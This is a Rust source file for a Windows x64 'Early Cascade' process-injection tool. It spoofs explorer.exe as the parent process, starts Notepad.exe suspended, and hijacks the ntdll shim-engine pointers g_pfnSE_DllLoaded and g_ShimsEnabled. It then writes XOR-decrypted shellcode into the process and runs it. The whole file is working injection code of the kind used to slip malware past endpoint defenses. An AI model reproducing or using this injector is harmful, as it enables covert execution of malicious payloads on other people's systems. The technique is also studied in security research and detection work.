/*
 .________      .________                   .__          .________
 |   ____/__.__.|   ____/     ___.__.______ |  |__  __ __|   ____/
 |____  <   |  ||____  \     <   |  |\____ \|  |  \|  |  \____  \ 
 /       \___  |/       \     \___  ||  |_> >   Y  \  |  /       \
/______  / ____/______  /_____/ ____||   __/|___|  /____/______  /
       \/\/           \/_____/\/     |__|        \/            \/ 

* ---------------------------------------------------------------------------
 * "The struggle itself toward the heights is enough to fill a man’s heart. One must imagine Sisyphus happy."
 * -- Albert Camus
 * ---------------------------------------------------------------------------
 * [+] tool : Early Cascade Injector
 * [+] Author    : 5y5_yphu5
 * [+] Target    : windows x64
 * ---------------------------------------------------------------------------
*/



use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE, ERROR_INSUFFICIENT_BUFFER},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        LibraryLoader::GetModuleHandleA,
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, HeapFree, VirtualAllocEx, VirtualProtectEx, GetProcessHeap, HeapAlloc, HEAP_ZERO_MEMORY},
        Threading::{
            CREATE_SUSPENDED, STARTUPINFOEXA, EXTENDED_STARTUPINFO_PRESENT, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            LPPROC_THREAD_ATTRIBUTE_LIST, OpenProcess, UpdateProcThreadAttribute, CreateProcessA,
            InitializeProcThreadAttributeList, PROCESS_INFORMATION, ResumeThread,
            TerminateProcess,
        },
    },
};

use windows_sys::core::s;
use std::ptr;

use crate::{
    core_file::{encode_system_ptr, find_pattern, find_se_dll_loaded, find_shims_enabled, get_process_pid},
    stubs::SHELLCODE,
    stubs::STUB,
};

mod core_file;
mod stubs;

// MAXIMUM_ALLOWED is defined in Windows SDK, but if the import fails, use the numeric value.
const MAXIMUM_ALLOWED: u32 = 0x02000000;

fn main() {
    unsafe {
        const TARGET_PROCESS: *const u8 = s!("Notepad.exe");

        println!(
            "[+] Creating test Process with suspended state:- {}",
            "Notepad.exe"
        );

        let target_process_name = "explorer.exe";
        let parent_pid = match get_process_pid(target_process_name) {
            Some(pid) => {
                println!("[+] Found {} with PID: {}", target_process_name, pid);
                pid
            }
            None => {
                eprintln!("[-] Could not find {}", target_process_name);
                return;
            }
        };

        // Use STARTUPINFOEXA for extended attributes
        let mut si: STARTUPINFOEXA = std::mem::zeroed();
        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();
        let mut attribute_size: usize = 0;

        let parent_process_handle = OpenProcess(MAXIMUM_ALLOWED, 0, parent_pid);
        if parent_process_handle == std::ptr::null_mut() {
            println!("OpenProcess failed, error: {}", GetLastError());
            return;
        }

        if InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attribute_size) == 0 {
            let err = GetLastError();
            if err != ERROR_INSUFFICIENT_BUFFER {
                println!("InitializeProcThreadAttributeList (size) failed, error: {}", err);
                CloseHandle(parent_process_handle);
                return;
            }
        }

        let heap = GetProcessHeap();
        if heap == std::ptr::null_mut() {
            println!("GetProcessHeap failed, error: {}", GetLastError());
            CloseHandle(parent_process_handle);
            return;
        }

        // Allocate memory for the attribute list
        let attribute_list = HeapAlloc(heap, HEAP_ZERO_MEMORY, attribute_size);
        if attribute_list.is_null() {
            println!("HeapAlloc failed, error: {}", GetLastError());
            CloseHandle(parent_process_handle);
            return;
        }

        // Initialize the attribute list
        if InitializeProcThreadAttributeList(
            attribute_list as LPPROC_THREAD_ATTRIBUTE_LIST,
            1,
            0,
            &mut attribute_size,
        ) == 0
        {
            println!("InitializeProcThreadAttributeList failed, error: {}", GetLastError());
            HeapFree(heap, 0, attribute_list);
            CloseHandle(parent_process_handle);
            return;
        }

        if UpdateProcThreadAttribute(
            attribute_list as LPPROC_THREAD_ATTRIBUTE_LIST,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &parent_process_handle as *const _ as *mut _,
            std::mem::size_of::<HANDLE>(),
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0
        {
            println!("UpdateProcThreadAttribute failed, error: {}", GetLastError());
            HeapFree(heap, 0, attribute_list);
            CloseHandle(parent_process_handle);
            return;
        }

        // Prepare STARTUPINFOEXA
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;
        si.lpAttributeList = attribute_list as LPPROC_THREAD_ATTRIBUTE_LIST;

        // Create the process suspended and with extended startup info
        let success = CreateProcessA(
            ptr::null(),
            TARGET_PROCESS as *mut u8, // cast to mutable pointer as required
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
            ptr::null_mut(),
            ptr::null(),
            &mut si.StartupInfo, // pass the embedded STARTUPINFOA
            &mut pi,
        );

        if success == 0 {
            eprintln!("[-] CreateProcess Failed, error: {}", GetLastError());
            HeapFree(heap, 0, attribute_list);
            CloseHandle(parent_process_handle);
            return;
        }

        println!("[+] process created in suspended state");

        // ... (rest of your injection code remains unchanged) ...
        let ntdll = GetModuleHandleA(s!("ntdll.dll")) as u64;

        let (se_dll_loaded, offset_addr) = match find_se_dll_loaded(ntdll) {
            Some(x) => x,
            None => {
                TerminateProcess(pi.hProcess, 1);
                HeapFree(heap, 0, attribute_list);
                CloseHandle(parent_process_handle);
                return;
            }
        };

        println!("[+]found se dll loaded");

        let shims_enabled = match find_shims_enabled(ntdll, offset_addr) {
            Some(x) => x,
            None => {
                println!("[-]shim enabled not found");
                TerminateProcess(pi.hProcess, 1);
                HeapFree(heap, 0, attribute_list);
                CloseHandle(parent_process_handle);
                return;
            }
        };

        println!("[+]found shim enabled");

        let remote_mem = VirtualAllocEx(
            pi.hProcess,
            std::ptr::null_mut(),
            STUB.len() + SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            TerminateProcess(pi.hProcess, 1);
            println!("[-] Failed to alloc mem");
            HeapFree(heap, 0, attribute_list);
            CloseHandle(parent_process_handle);
            return;
        }

        let stub_addr = remote_mem as u64;
        let shell_addr = stub_addr + STUB.len() as u64;

        let placeholder = find_pattern(STUB, &[0x11; 8]).unwrap_or(0);
        let mut patched_stub = STUB.to_vec();
        patched_stub[placeholder..placeholder + 8].copy_from_slice(&shims_enabled.to_le_bytes());

        WriteProcessMemory(
            pi.hProcess,
            remote_mem,
            patched_stub.as_ptr() as _,
            patched_stub.len(),
            std::ptr::null_mut(),
        );

        println!("[+] Write 1 - OK");

        let key = b"test";

        let decrypted_shellcode: Vec<u8> = SHELLCODE
            .iter()
            .enumerate()
            .map(|(i, &byte)| byte ^ key[i % key.len()])
            .collect();

        WriteProcessMemory(
            pi.hProcess,
            shell_addr as _,
            decrypted_shellcode.as_ptr() as _,
            decrypted_shellcode.len(),
            std::ptr::null_mut(),
        );

        println!("[+] Write 2 - OK");

        let encoded_ptr = encode_system_ptr(stub_addr);

        WriteProcessMemory(
            pi.hProcess,
            se_dll_loaded as _,
            &encoded_ptr as *const _ as _,
            8,
            std::ptr::null_mut(),
        );

        println!("[+] Write 3 - OK");

        let enable: u8 = 1;

        WriteProcessMemory(
            pi.hProcess,
            shims_enabled as _,
            &enable as *const _ as _,
            1,
            std::ptr::null_mut(),
        );

        println!("[+] Write 4 - OK");

        let mut old_protect: u32 = 0;
        let result = VirtualProtectEx(
            pi.hProcess,
            remote_mem,
            patched_stub.len() + decrypted_shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if result == 0 {
            println!("failed to change protection");
            TerminateProcess(pi.hProcess, 1);
            return;
        }

        ResumeThread(pi.hThread);

        // Cleanup
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(heap, 0, attribute_list);
        CloseHandle(parent_process_handle);

        println!("[+] Executed Successfully");
    }
}